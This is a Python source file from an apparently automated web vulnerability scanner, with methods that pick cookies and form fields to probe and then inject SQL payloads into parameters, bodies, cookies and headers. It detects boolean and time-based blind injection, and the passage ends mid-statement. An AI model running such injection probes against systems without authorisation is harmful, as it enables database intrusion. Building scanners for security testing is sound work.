"""
SQLi helper/utility methods for ScanWorker.
"""
"""
Shared imports for scan mixin modules.
"""
import json
import logging
import requests
import urllib.parse
import re
import concurrent.futures
import html as html_module
import time
from typing import Dict, Any, List, Optional, Tuple
from collections import defaultdict

logger = logging.getLogger(__name__)



class SqliHelpersMixin:
    """Mixin providing SQLi helper/utility methods."""

    @staticmethod
    def _should_test_cookie(name: str, value: str) -> Tuple[bool, str]:
        """
        Decide whether a cookie is worth testing for SQL injection.
        Returns (should_test: bool, reason: str).

        Two-layer filter:
          Layer 1 — Name blocklist: known framework/analytics/CDN cookies that
                    never touch application database queries.
          Layer 2 — Value heuristic: pure random tokens (long hex/base64) are
                    looked up by equality only, never interpolated into SQL.

        A cookie passes if it clears BOTH layers.
        """

        name_lower  = name.lower()
        value_strip = value.strip()

        # ── LAYER 1: Name blocklist ──────────────────────────────────────────
        # Exact-match names (case-insensitive)
        BLOCKED_NAMES_EXACT = {
            # Session handles — opaque tokens, server does key=value lookup only
            'session', 'sessionid', 'session_id',
            'phpsessid', 'jsessionid', 'asp.net_sessionid',
            'laravel_session', 'ci_session', 'rack.session',
            'django_session', 'beaker.session', 'symfony',
            # CSRF tokens — validated by equality, never queried
            'csrf_token', '_csrf', '_csrf_token', 'csrftoken',
            'xsrf-token', 'x-xsrf-token', '_token',
            'authenticity_token', 'csrf',
            # Google Analytics
            '_ga', '_gid', '_gat', '_gat_ua',
            '__utma', '__utmb', '__utmc', '__utmz', '__utmt',
            # Facebook / Meta pixel
            '_fbp', '_fbc', 'fr',
            # Cloudflare
            '__cf_bm', 'cf_clearance', '__cflb', '__cfruid',
            # Datadog / New Relic / monitoring
            '_dd_s', 'newrelic',
            # Cookie consent banners
            'cookieconsent', 'cookie_consent', 'gdpr',
            'cookie_notice_accepted', 'cookieyes',
            # Stripe / payment processors
            '__stripe_mid', '__stripe_sid',
            # Misc infrastructure
            'incap_ses', 'visid_incap',   # Imperva
            'ak_bmsc', 'bm_sz',           # Akamai Bot Manager
            '_abck',                       # Akamai
            'utag_main',                   # Tealium
        }

        # Prefix/suffix patterns — names starting or ending with these strings
        # are almost certainly analytics or framework internals
        BLOCKED_NAME_PREFIXES = (
            '_ga_', '_gat_', '__utm', '__cf',
            'amplitude_', 'mixpanel_', 'intercom-',
            'hubspot', 'marketo', 'eloqua',
        )
        BLOCKED_NAME_SUFFIXES = (
            '_session', '_token', '_csrf',
        )

        if name_lower in BLOCKED_NAMES_EXACT:
            return False, f"Blocked name '{name}' (known framework/analytics cookie)"

        if any(name_lower.startswith(p) for p in BLOCKED_NAME_PREFIXES):
            return False, f"Blocked name '{name}' (matches analytics/CDN prefix)"

        if any(name_lower.endswith(s) for s in BLOCKED_NAME_SUFFIXES):
            return False, f"Blocked name '{name}' (matches session/token suffix)"

        # ── LAYER 2: Value heuristic ─────────────────────────────────────────
        # Pure random tokens look like long hex strings or base64.
        # Real app values that end up in SQL queries tend to be:
        #   • Short (< 40 chars)
        #   • Contain readable words, digits, dots, hyphens
        #   • Structured (e.g. "Accessories", "123", "en-US", "user@email.com")
        #
        # We skip a value if ALL of these are true:
        #   a) Length ≥ 32 chars  (short values are almost never pure tokens)
        #   b) Looks like hex or base64  (high entropy, no readable structure)
        #   c) No whitespace or readable separators (dots, hyphens, underscores
        #      mixed with letters suggest a structured value, not a token)

        if len(value_strip) >= 32:
            # Check for pure hex token  (0-9, a-f only, even length)
            is_hex = bool(re.fullmatch(r'[0-9a-fA-F]+', value_strip))

            # Check for base64-ish  (alphanum + /+=, high density of uppercase)
            is_b64 = bool(re.fullmatch(r'[A-Za-z0-9+/=_\-]+', value_strip))
            uppercase_ratio = sum(1 for c in value_strip if c.isupper()) / len(value_strip)
            digit_ratio     = sum(1 for c in value_strip if c.isdigit())  / len(value_strip)

            # A value is "token-like" if it's hex, OR if it's base64-ish with
            # high entropy (mix of upper/lower/digits, no readable separators)
            has_readable_separators = any(c in value_strip for c in ['.', '-', '_', ' ', '@'])
            is_token_like = (
                is_hex
                or (is_b64
                    and not has_readable_separators
                    and (uppercase_ratio > 0.15 or digit_ratio > 0.3)
                    and len(value_strip) >= 32)
            )

            if is_token_like:
                return False, (
                    f"Skipped '{name}' — value looks like a random token "
                    f"(len={len(value_strip)}, "
                    f"{'hex' if is_hex else 'base64-like'})"
                )

        # Passed both layers — worth testing
        return True, f"Testing '{name}' — looks like an application value"

    @staticmethod
    def _should_test_body_param(name: str, value: str) -> Tuple[bool, str]:
        """
        Decide whether a POST body parameter is worth testing for SQL injection.
        Returns (should_test: bool, reason: str).

        Same two-layer approach as _should_test_cookie:
          Layer 1 — Name blocklist: fields that are validated by equality or
                    ignored by the DB layer (CSRF tokens, nonces, hidden
                    framework fields, honeypots, pagination/state tokens).
          Layer 2 — Value heuristic: long random-token values are never
                    interpolated into SQL queries.
        """

        name_lower  = name.lower()
        value_strip = value.strip()

        # ── LAYER 1: Name blocklist ──────────────────────────────────────────

        BLOCKED_NAMES_EXACT = {
            # ── CSRF / anti-forgery tokens ───────────────────────────────
            'csrf_token', 'csrftoken', '_csrf', '_csrf_token', 'csrf',
            'csrfmiddlewaretoken',           # Django
            'authenticity_token',            # Rails
            'xsrf_token', 'xsrf-token',
            '_token',                        # Laravel / generic
            'form_token', 'form_key',        # Magento
            '__requestverificationtoken',    # ASP.NET MVC
            'x-csrf-token', 'x-xsrf-token',
            '_wpnonce',                      # WordPress nonce
            'nonce', '_nonce',

            # ── Hidden framework / session fields ────────────────────────
            '__viewstate',                   # ASP.NET WebForms
            '__viewstategenerator',
            '__eventvalidation',
            '__eventtarget',
            '__eventargument',
            '__previouspage',
            'javax.faces.viewstate',         # JSF
            'javax.faces.encodedurl',
            '__ncforminfo',                  # .NET
            '__utf8',                        # Rails UTF-8 hidden field
            '_method',                       # Rails method override
            'utf8',

            # ── Honeypot / bot-trap fields ───────────────────────────────
            'honeypot', 'hp', 'bot_check', 'h0n3yp0t',
            'website',   # common honeypot name in contact forms
            'url',       # often used as a honeypot (left blank by humans)
            'fax',       # classic honeypot

            # ── Pagination / navigation state ────────────────────────────
            'page', 'per_page', 'limit', 'offset',
            'sort', 'sort_by', 'order', 'order_by', 'direction',
            'tab', 'step', 'next', 'prev',

            # ── Generic submit / button values ───────────────────────────
            'submit', 'btn', 'button', 'action', 'commit',

            # ── Captcha ──────────────────────────────────────────────────
            'g-recaptcha-response', 'h-captcha-response',
            'captcha', 'captcha_code', 'captcha_answer',

            # ── Stripe / payment tokens ──────────────────────────────────
            'stripetoken', 'stripe_token', 'stripe_source',
            'payment_method_nonce',          # Braintree

            # ── Analytics / tracking ─────────────────────────────────────
            'utm_source', 'utm_medium', 'utm_campaign',
            'utm_term', 'utm_content',
            'fbclid', 'gclid', 'msclkid', 'ttclid',

            # ── Return / redirect hints ──────────────────────────────────
            'return_url', 'redirect_url', 'next_url', 'redirect_to',
            'return_to', 'continue',
        }

        BLOCKED_NAME_PREFIXES = (
            'csrf',      # csrf_anything
            'xsrf',
            '__',        # __viewstate, __eventXxx, __utf8 etc.
            'utm_',      # UTM tracking params
            'wp_',       # WordPress internals
            'wc_',       # WooCommerce internals
            'woocommerce_',
            'vc_',       # Visual Composer
        )

        BLOCKED_NAME_SUFFIXES = (
            '_token',    # any_token
            '_nonce',    # any_nonce
            '_csrf',     # any_csrf
            '_hash',     # state/integrity hashes, not queried
            '_hmac',
            '_signature',
            '_key',      # api_key, secret_key — validated, not queried
            '_verify',
            '_check',
        )

        if name_lower in BLOCKED_NAMES_EXACT:
            return False, f"Blocked field '{name}' (non-queryable form field)"

        if any(name_lower.startswith(p) for p in BLOCKED_NAME_PREFIXES):
            return False, f"Blocked field '{name}' (matches framework/tracking prefix)"

        if any(name_lower.endswith(s) for s in BLOCKED_NAME_SUFFIXES):
            return False, f"Blocked field '{name}' (matches token/hash suffix)"

        # ── LAYER 2: Value heuristic (same logic as cookie filter) ───────────
        if len(value_strip) >= 32:
            is_hex = bool(re.fullmatch(r'[0-9a-fA-F]+', value_strip))
            is_b64 = bool(re.fullmatch(r'[A-Za-z0-9+/=_\-]+', value_strip))
            uppercase_ratio = sum(1 for c in value_strip if c.isupper()) / len(value_strip)
            digit_ratio     = sum(1 for c in value_strip if c.isdigit()) / len(value_strip)
            has_readable_separators = any(
                c in value_strip for c in ['.', '-', '_', ' ', '@']
            )
            is_token_like = (
                is_hex
                or (is_b64
                    and not has_readable_separators
                    and (uppercase_ratio > 0.15 or digit_ratio > 0.3)
                    and len(value_strip) >= 32)
            )
            if is_token_like:
                return False, (
                    f"Skipped '{name}' — value looks like a random token "
                    f"(len={len(value_strip)}, "
                    f"{'hex' if is_hex else 'base64-like'})"
                )

        return True, f"Testing '{name}' — looks like an application value"

    @staticmethod
    def _build_cookie_headers(headers: dict, cookies: dict,
                               target_name: str, new_value: str) -> dict:
        """
        Build a headers dict with the Cookie header correctly reconstructed.

        Problems this solves:
          1. The original `headers` dict may contain the Cookie header under
             any case variant ('cookie', 'Cookie', 'COOKIE').  We must strip
             ALL of them before inserting our new Cookie header, otherwise
             the request ends up with two Cookie headers.
          2. Cookie values containing special chars (quotes, semicolons, etc.)
             must be quoted so the server can parse them correctly.

        Args:
            headers:     The original parsed headers dict.
            cookies:     Dict of {name: value} for all cookies in baseline.
            target_name: The specific cookie name whose value we're injecting.
            new_value:   The new value for target_name (original_value + payload).

        Returns:
            A new headers dict with Host stripped, all original Cookie keys
            stripped, and a single correctly-formed Cookie header inserted.
        """
        # 1. Copy headers, dropping Host AND any Cookie variant
        test_headers = {
            k: v for k, v in headers.items()
            if k.lower() not in ('host', 'cookie')
        }

        # 2. Build the modified cookies dict
        test_cookies = cookies.copy()

        # 3. Quote the value if it contains characters that break cookie parsing
        #    Only quote if not already quoted
        quoted_value = new_value
        needs_quoting = any(c in new_value for c in [' ', '"', ';', '\\'])
        if needs_quoting and not (new_value.startswith('"') and new_value.endswith('"')):
            # Escape any existing double-quotes inside the value
            quoted_value = '"' + new_value.replace('"', '\\"') + '"'
        test_cookies[target_name] = quoted_value

        # 4. Reconstruct the Cookie header  (standard '; ' separator)
        cookie_header = '; '.join(f"{k}={v}" for k, v in test_cookies.items())
        test_headers['Cookie'] = cookie_header

        return test_headers

    def _get_login_baseline(self, full_url, parsed, params, headers, cookies,
                             body_params, method, fallback_time: float) -> float:
        """
        Measure a fresh baseline response time for login-endpoint time probes.
        Sends a clean request (no injection) and returns elapsed seconds.
        Falls back to the initial baseline_time if the request fails.
        """
        import time as _time
        try:
            start = _time.time()
            clean_headers = {k: v for k, v in headers.items() if k.lower() != 'host'}
            if method == "POST":
                content_type = headers.get("Content-Type", "").lower()
                body = (
                    __import__('json').dumps({k: v[0] for k, v in body_params.items()})
                    if "application/json" in content_type
                    else __import__('urllib.parse', fromlist=['urlencode']).urlencode(body_params, doseq=True)
                )
                self.send_request_with_traffic(
                    full_url, clean_headers, method="POST",
                    body=body, payload_type="SQLi-LoginBaseline-Fresh"
                )
            else:
                self.send_request_with_traffic(
                    full_url, clean_headers, method=method,
                    payload_type="SQLi-LoginBaseline-Fresh"
                )
            return _time.time() - start
        except Exception:
            return fallback_time

    def _send_error_payload(self, point, full_url, parsed, params, headers, cookies, body_params,
                            method, payload_name, payload):
        """Send a single error-based payload - ALWAYS returns a response object"""
        try:
            if point["type"] == "URL Parameter":
                test_params = params.copy()
                test_params[point["name"]] = [point["original_value"] + payload]
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                
                return self.send_request_with_traffic(
                    test_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method="GET",
                    payload=payload,
                    payload_type=f"SQLi-Error-{point['name']}-{payload_name}"
                )
            
            elif point["type"] == "POST Body":
                # For single-use CSRF tokens: serialise the GET(refresh)+POST(inject)
                # pair so boost-mode threads don't race — one thread fetches and
                # consumes a token at a time.
                fresh_body_params, fresh_headers = self._with_fresh_csrf(
                    body_params, full_url, headers
                )
                test_body_params = fresh_body_params.copy()
                test_body_params[point["name"]] = [point["original_value"] + payload]

                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    test_body = json.dumps({k: v[0] for k, v in test_body_params.items()})
                else:
                    test_body = urllib.parse.urlencode(test_body_params, doseq=True)

                return self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in fresh_headers.items() if k.lower() != 'host'},
                    method="POST",
                    body=test_body,
                    payload=payload,
                    payload_type=f"SQLi-Error-POST-{point['name']}-{payload_name}"
                )
            
            elif point["type"] == "Cookie":
                test_headers = self._build_cookie_headers(
                    headers, cookies,
                    target_name=point["name"],
                    new_value=point["original_value"] + payload
                )
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Error-Cookie-{point['name']}-{payload_name}"
                )
            
            else:  # HTTP Header
                test_headers = {k: v for k, v in headers.items() if k.lower() != 'host'}
                test_headers[point["name"]] = point["original_value"] + payload
                
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=f"SQLi-Error-Header-{point['name']}-{payload_name}"
                )
        except Exception as e:
            logger.warning(f"Error payload failed: {e}")
            # Return the same ErrorResponse class
            return self.ErrorResponse(str(e))
    
    def _test_boolean_based(self, point, full_url, parsed, params, headers, cookies, body_params,
                            method, baseline_status, baseline_length, baseline_text, payloads, param_reflected):
        """Test for boolean-based blind SQL injection"""
        results = {
            "vulnerable": False,
            "details": [],
            "indicators": []
        }
        
        # Group boolean payloads into true/false pairs
        bool_pairs = [
            ("bool_string_true", "bool_string_false"),
            ("bool_string_true_alt", "bool_string_false_alt"),
            ("bool_numeric_true", "bool_numeric_false"),
            ("bool_numeric_true_alt", "bool_numeric_false_alt"),
            ("bool_and_true", "bool_and_false"),
            ("bool_parenthesis_true", "bool_parenthesis_false"),
            ("bool_parenthesis2_true", "bool_parenthesis2_false"),
            ("case_true", "case_false"),
            # Classic tracking-cookie / conditional-response pairs
            ("bool_track_true",   "bool_track_false"),
            ("bool_track_dq_true","bool_track_dq_false"),
            # Subquery existence probes
            ("bool_exists_users_true",  "bool_exists_users_false"),
            ("bool_admin_exists_true",  "bool_admin_exists_false"),
        ]
        
        true_responses = {}
        false_responses = {}
        
        # Use ThreadPoolExecutor for parallel testing if boost mode is enabled
        if self.boost_mode:
            with concurrent.futures.ThreadPoolExecutor(max_workers=getattr(self, "scan_max_workers", 8)) as executor:
                # Submit all true payloads
                true_futures = {}
                for true_name, _ in bool_pairs:
                    if true_name in payloads:
                        future = executor.submit(
                            self._send_boolean_payload,
                            point, full_url, parsed, params, headers, cookies, body_params,
                            method, payloads[true_name], f"Boolean-{true_name}"
                        )
                        true_futures[future] = true_name
                
                # Submit all false payloads
                false_futures = {}
                for _, false_name in bool_pairs:
                    if false_name in payloads:
                        future = executor.submit(
                            self._send_boolean_payload,
                            point, full_url, parsed, params, headers, cookies, body_params,
                            method, payloads[false_name], f"Boolean-{false_name}"
                        )
                        false_futures[future] = false_name
                
                # Collect true responses
                for future in concurrent.futures.as_completed(true_futures):
                    true_name = true_futures[future]
                    try:
                        response = future.result(timeout=15)
                        if response:
                            true_responses[true_name] = {
                                "status": response.status_code,
                                "length": len(response.content),
                                "text": response.text if hasattr(response, 'text') else ""
                            }
                    except Exception as e:
                        continue
                
                # Collect false responses
                for future in concurrent.futures.as_completed(false_futures):
                    false_name = false_futures[future]
                    try:
                        response = future.result(timeout=15)
                        if response:
                            false_responses[false_name] = {
                                "status": response.status_code,
                                "length": len(response.content),
                                "text": response.text if hasattr(response, 'text') else ""
                            }
                    except Exception as e:
                        continue
        else:
            # Sequential testing
            for true_name, false_name in bool_pairs:
                if true_name not in payloads or false_name not in payloads:
                    continue
                
                # Test TRUE condition
                true_response = self._send_boolean_payload(
                    point, full_url, parsed, params, headers, cookies, body_params,
                    method, payloads[true_name], f"Boolean-{true_name}"
                )
                
                if true_response:
                    true_responses[true_name] = {
                        "status": true_response.status_code,
                        "length": len(true_response.content),
                        "text": true_response.text if hasattr(true_response, 'text') else ""
                    }
                
                # Test FALSE condition
                false_response = self._send_boolean_payload(
                    point, full_url, parsed, params, headers, cookies, body_params,
                    method, payloads[false_name], f"Boolean-{false_name}"
                )
                
                if false_response:
                    false_responses[false_name] = {
                        "status": false_response.status_code,
                        "length": len(false_response.content),
                        "text": false_response.text if hasattr(false_response, 'text') else ""
                    }
        
        # ---------- IMPROVED DETECTION LOGIC (multi-pair consensus) ----------
        # Collect all candidate pairs before deciding — require at least 2 independent
        # pairs to agree before flagging as vulnerable. This prevents a single dynamic
        # content fluctuation (CSRF token, timestamp, ad counter) from causing a false positive.
        
        candidate_findings = []

        for true_name, false_name in bool_pairs:
            if true_name in true_responses and false_name in false_responses:
                true_len = true_responses[true_name]["length"]
                false_len = false_responses[false_name]["length"]
                len_diff = abs(true_len - false_len)

                true_status = true_responses[true_name]["status"]
                false_status = false_responses[false_name]["status"]

                # Normalised difference relative to baseline (avoids large-page bias)
                relative_diff = len_diff / max(baseline_length, 1)

                # Similarity to baseline (values close to 1.0 = matches baseline)
                true_similarity = 1.0
                false_similarity = 1.0
                if baseline_length > 0:
                    true_similarity  = 1 - (abs(true_len  - baseline_length) / baseline_length)
                    false_similarity = 1 - (abs(false_len - baseline_length) / baseline_length)

                is_candidate = False
                detection_reason = ""

                # CRITERION 1: Relative size difference ≥5% AND absolute ≥100 bytes
                # (prevents tiny dynamic-content fluctuations from triggering)
                if relative_diff >= 0.05 and len_diff >= 100:
                    is_candidate = True
                    detection_reason = (
                        f"Content difference {len_diff}b ({relative_diff*100:.1f}%) "
                        f"between true/false conditions"
                    )

                # CRITERION 2: Different HTTP status codes between true/false
                elif true_status != false_status and true_status > 0 and false_status > 0:
                    is_candidate = True
                    detection_reason = (
                        f"Status code divergence: true={true_status} vs false={false_status}"
                    )

                # CRITERION 3: One side closely matches baseline (≥97%), the other differs
                # substantially (≥5% relative AND ≥100 bytes absolute)
                elif (false_similarity >= 0.97 and
                      relative_diff >= 0.05 and
                      abs(true_len - baseline_length) >= 100):
                    is_candidate = True
                    detection_reason = (
                        f"False matches baseline ({false_len}b), "
                        f"true diverges by {abs(true_len - baseline_length)}b"
                    )
                elif (true_similarity >= 0.97 and
                      relative_diff >= 0.05 and
                      abs(false_len - baseline_length) >= 100):
                    is_candidate = True
                    detection_reason = (
                        f"True matches baseline ({true_len}b), "
                        f"false diverges by {abs(false_len - baseline_length)}b"
                    )

                if is_candidate:
                    candidate_findings.append({
                        "payload_pair": f"{true_name}/{false_name}",
                        "true_length": true_len,
                        "false_length": false_len,
                        "difference": len_diff,
                        "relative_diff_pct": round(relative_diff * 100, 1),
                        "detection_reason": detection_reason,
                        "param_reflected": param_reflected,
                        "true_matches_baseline": true_similarity >= 0.97,
                        "false_matches_baseline": false_similarity >= 0.97
                    })

        # Require at least N independent pairs to agree — configurable via Scan Config dialog
        REQUIRED_CONSENSUS = getattr(self, 'scan_bool_consensus', 2)
        if len(candidate_findings) >= REQUIRED_CONSENSUS:
            results["vulnerable"] = True
            for finding in candidate_findings:
                results["details"].append(finding)
                results["indicators"].append(
                    f"Boolean-based ({finding['detection_reason']})"
                )
                self.scan_progress.emit(
                    f"  ✅ Boolean-based [{finding['payload_pair']}]: "
                    f"{finding['detection_reason']} (diff={finding['difference']}b, "
                    f"{finding['relative_diff_pct']}%)"
                )
        elif len(candidate_findings) == 1:
            # Single hit — log as informational, do NOT mark vulnerable
            f = candidate_findings[0]
            self.scan_progress.emit(
                f"  ℹ️  Boolean borderline (1/2 pairs) [{f['payload_pair']}]: "
                f"{f['detection_reason']} — needs 2nd pair to confirm"
            )

        # ── CONDITIONAL-RESPONSE KEYWORD DETECTION ("Welcome back" style) ──────
        # Mirrors the PortSwigger technique: inject AND '1'='1 vs AND '1'='2 into
        # a tracking cookie / param and look for a known keyword appearing ONLY in
        # the true-condition response.  This detects subtle boolean changes even
        # when the page size doesn't change much.
        WELCOME_KEYWORDS = [
            "welcome back", "logged in", "hello,", "hi,", "greetings",
            "you are logged", "signed in", "dashboard", "my account",
            "valid user", "authenticated", "session active",
        ]

        for true_name, false_name in bool_pairs:
            if not self.running:
                break
            if true_name not in true_responses or false_name not in false_responses:
                continue

            true_text  = true_responses[true_name]["text"].lower()
            false_text = false_responses[false_name]["text"].lower()

            for kw in WELCOME_KEYWORDS:
                kw_in_true  = kw in true_text
                kw_in_false = kw in false_text

                # Keyword present in true condition but NOT in false condition → blind boolean confirmed
                if kw_in_true and not kw_in_false:
                    self.scan_progress.emit(
                        f"  ✅ Conditional-response keyword [{true_name}/{false_name}]: "
                        f"keyword '{kw}' present in TRUE response, absent in FALSE response"
                    )
                    results["vulnerable"] = True
                    detail = {
                        "technique":        "conditional_response_keyword",
                        "payload_pair":     f"{true_name}/{false_name}",
                        "keyword":          kw,
                        "detection_reason": (
                            f"Keyword '{kw}' appears in true-condition response but not false-condition. "
                            "Classic blind boolean (Welcome-back) SQLi pattern confirmed."
                        ),
                        "true_length":  true_responses[true_name]["length"],
                        "false_length": false_responses[false_name]["length"],
                    }
                    results["details"].append(detail)
                    results["indicators"].append(
                        f"Conditional-response keyword: '{kw}' in true, absent in false ({true_name}/{false_name})"
                    )
                    break

                # Keyword absent in true condition but present in false → also interesting (reversed)
                elif kw_in_false and not kw_in_true:
                    self.scan_progress.emit(
                        f"  ✅ Conditional-response keyword [{true_name}/{false_name}]: "
                        f"keyword '{kw}' present in FALSE response, absent in TRUE — may indicate inverse condition"
                    )
                    results["vulnerable"] = True
                    detail = {
                        "technique":        "conditional_response_keyword_inverse",
                        "payload_pair":     f"{true_name}/{false_name}",
                        "keyword":          kw,
                        "detection_reason": (
                            f"Keyword '{kw}' appears in false-condition response but not true-condition. "
                            "Inverse conditional-response pattern — likely injectable."
                        ),
                        "true_length":  true_responses[true_name]["length"],
                        "false_length": false_responses[false_name]["length"],
                    }
                    results["details"].append(detail)
                    results["indicators"].append(
                        f"Conditional-response keyword (inverse): '{kw}' in false, absent in true ({true_name}/{false_name})"
                    )
                    break

            if results["vulnerable"]:
                break  # One confirmed keyword hit is enough
        
        return results

    def _send_boolean_payload(self, point, full_url, parsed, params, headers, cookies, body_params,
                              method, payload, payload_type):
        """Send a single boolean-based payload"""
        try:
            if point["type"] == "URL Parameter":
                test_params = params.copy()
                test_params[point["name"]] = [point["original_value"] + payload]
                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                
                return self.send_request_with_traffic(
                    test_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method="GET",
                    payload=payload,
                    payload_type=payload_type
                )
            
            elif point["type"] == "POST Body":
                fresh_body_params, fresh_headers = self._with_fresh_csrf(
                    body_params, full_url, headers
                )
                test_body_params = fresh_body_params.copy()
                test_body_params[point["name"]] = [point["original_value"] + payload]

                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    test_body = json.dumps({k: v[0] for k, v in test_body_params.items()})
                else:
                    test_body = urllib.parse.urlencode(test_body_params, doseq=True)

                return self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in fresh_headers.items() if k.lower() != 'host'},
                    method="POST",
                    body=test_body,
                    payload=payload,
                    payload_type=payload_type
                )

            elif point["type"] == "Cookie":
                test_headers = self._build_cookie_headers(
                    headers, cookies,
                    target_name=point["name"],
                    new_value=point["original_value"] + payload
                )
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=payload_type
                )
            
            else:  # HTTP Header
                test_headers = {k: v for k, v in headers.items() if k.lower() != 'host'}
                test_headers[point["name"]] = point["original_value"] + payload
                
                return self.send_request_with_traffic(
                    full_url,
                    test_headers,
                    method=method,
                    payload=payload,
                    payload_type=payload_type
                )
                
        except Exception as e:
            logger.warning(f"Boolean payload failed: {e}")
            return None

    def _test_time_based(self, point, full_url, parsed, params, headers, cookies, body_params,
                        method, baseline_time, payloads):
        """
        Test for time-based blind SQL injection.

        IMPORTANT: Always runs sequentially — even in boost mode.
        Parallel requests corrupt response timing (server load + network contention),
        which would cause false positives on any server under load.
        Each payload is tested with a fresh baseline immediately before it to account
        for natural response time variance.

        Speed-mode notes:
          • scan_req_delay is SUPPRESSED during time-based sends — artificial sleep
            would add noise to every baseline measurement and slow the phase for no gain.
          • scan_timeout is AUTO-RAISED to max_expected_delay + 15s so Fast mode's
            short timeout doesn't silently drop SLEEP(5)/SLEEP(10) payloads.
        """
        results = {
            "vulnerable": False,
            "details": [],
            "indicators": [],
            "db_fingerprint": None
        }

        # Map payload names to expected delays (seconds)
        TIME_PAYLOAD_DELAYS = {
            "time_mysql_2": 2, "time_mysql_3": 3, "time_mysql_5": 5,
            "time_pip_mysql": 3, "time_mysql_benchmark": 5,
            "time_pgsql_2": 2, "time_pgsql_3": 3, "time_pgsql_5": 5,
            "time_pip_postgres": 3,
            "time_mssql_2": 2, "time_mssql_3": 3, "time_mssql_5": 5,
            "time_oracle_2": 2, "time_oracle_3": 3,
            "time_sqlite": 2,
            "heavy_query_mysql": 3, "heavy_query_pgsql": 3,
        }

        # ── Suppress inter-request delay for time-based phase ────────────────
        # scan_req_delay would add artificial sleep to BOTH the baseline and
        # payload requests equally — so time_diff stays accurate, but the phase
        # becomes extremely slow in Slow mode for zero benefit.  We suspend it
        # here and restore it when the phase ends.
        _saved_delay = self.scan_req_delay
        self.scan_req_delay = 0.0

        # ── Auto-raise timeout for time-based payloads ────────────────────────
        # Fast mode sets timeout=15s. A SLEEP(10) payload + network overhead can
        # legitimately take 12–14s, so it risks timing out and being silently
        # dropped as a missed detection.  We temporarily raise the timeout to
        # max_expected_delay + 15s (e.g. 20s for SLEEP(5), 25s for SLEEP(10)).
        max_expected_delay = max(TIME_PAYLOAD_DELAYS.values())  # 5s
        _min_time_timeout = max_expected_delay + 15             # 20s minimum
        _saved_timeout = self.scan_timeout
        if self.scan_timeout < _min_time_timeout:
            self.scan_timeout = _min_time_timeout
            self.scan_progress.emit(
                f"  ℹ️  Time-based: timeout auto-raised from {_saved_timeout}s "
                f"to {_min_time_timeout}s (Fast mode — prevents SLEEP payload timeouts)"
            )

        try:
            db_payloads = {
                "MySQL":      [k for k in payloads if "mysql"     in k or "benchmark" in k or "pip_mysql"    in k],
                "PostgreSQL": [k for k in payloads if "pgsql"     in k or "pip_postgres" in k],
                "MSSQL":      [k for k in payloads if "mssql"     in k],
                "Oracle":     [k for k in payloads if "oracle"    in k],
                "SQLite":     [k for k in payloads if "sqlite"    in k or "heavy"       in k],
            }

            def get_fresh_baseline() -> float:
                """Measure current baseline response time with a clean request."""
                try:
                    start = time.time()
                    if method == "POST":
                        content_type = headers.get("Content-Type", "").lower()
                        body = (json.dumps({k: v[0] for k, v in body_params.items()})
                                if "application/json" in content_type
                                else urllib.parse.urlencode(body_params, doseq=True))
                        self.send_request_with_traffic(
                            full_url,
                            {k: v for k, v in headers.items() if k.lower() != 'host'},
                            method="POST", body=body, payload_type="SQLi-Baseline-Fresh"
                        )
                    else:
                        self.send_request_with_traffic(
                            full_url,
                            {k: v for k, v in headers.items() if k.lower() != 'host'},
                            method=method, payload_type="SQLi-Baseline-Fresh"
                        )
                    return time.time() - start
                except Exception:
                    return baseline_time

            # NOTE: intentionally NOT using ThreadPoolExecutor here.
            # Parallel time-based tests corrupt timing measurements.
            if self.boost_mode:
                self.scan_progress.emit(
                    "  ⚠️  Time-based: running SEQUENTIAL (boost mode disabled for timing accuracy)"
                )
            if _saved_delay > 0:
                self.scan_progress.emit(
                    f"  ℹ️  Time-based: inter-request delay suppressed ({_saved_delay}s → 0s) "
                    f"for accurate timing measurement"
                )

            for db_name, payload_names in db_payloads.items():
                if not self.running:
                    break
                if results["vulnerable"]:
                    break  # Stop after first confirmed DB — reduces unnecessary requests

                for payload_name in payload_names:
                    if not self.running or payload_name not in payloads:
                        break

                    # Fresh baseline immediately before each timed test
                    current_baseline = get_fresh_baseline()

                    response, elapsed, timed_out = self._send_time_payload(
                        point, full_url, parsed, params, headers, cookies, body_params,
                        method, payload_name, payloads[payload_name]
                    )

                    # ── CRITICAL: discard results where the connection timed out ──
                    # A ReadTimeout means the OS/proxy killed the connection after the
                    # configured timeout ceiling (e.g. 20 s).  The measured elapsed
                    # equals that ceiling — NOT a genuine DB SLEEP().  Counting it as
                    # a delay would produce a false positive every time.
                    if timed_out:
                        self.scan_progress.emit(
                            f"  ⚠️  Time-based [{db_name}]: {payload_name} — "
                            f"REQUEST TIMED OUT (elapsed={elapsed:.2f}s) — "
                            f"this is a connection timeout, NOT a DB delay — skipping"
                        )
                        continue

                    if not response or not hasattr(response, 'status_code'):
                        continue

                    expected_delay = TIME_PAYLOAD_DELAYS.get(payload_name, 2)
                    time_diff = elapsed - current_baseline

                    # Threshold: must exceed baseline by ≥75% of expected delay AND ≥configured threshold.
                    # The 75% (not 100%) accounts for server jitter while still requiring a
                    # meaningful delay. The absolute floor is configurable via Scan Config dialog.
                    _time_threshold = getattr(self, 'scan_time_threshold', 1.5)
                    required_diff = max(_time_threshold, expected_delay * 0.75)

                    if time_diff >= required_diff:
                        # ── Confirmation probe ───────────────────────────────────────
                        # One delayed response could be server load, GC pause, or network
                        # jitter. Repeat the EXACT same payload — if the delay repeats,
                        # it's genuine injection. If not, it was noise.
                        self.scan_progress.emit(
                            f"  🔄 Time-based [{db_name}]: {payload_name} — "
                            f"elapsed={elapsed:.2f}s (threshold={required_diff:.2f}s) "
                            f"— repeating to confirm..."
                        )
                        confirm_baseline = get_fresh_baseline()
                        confirm_response, confirm_elapsed, confirm_timed_out = self._send_time_payload(
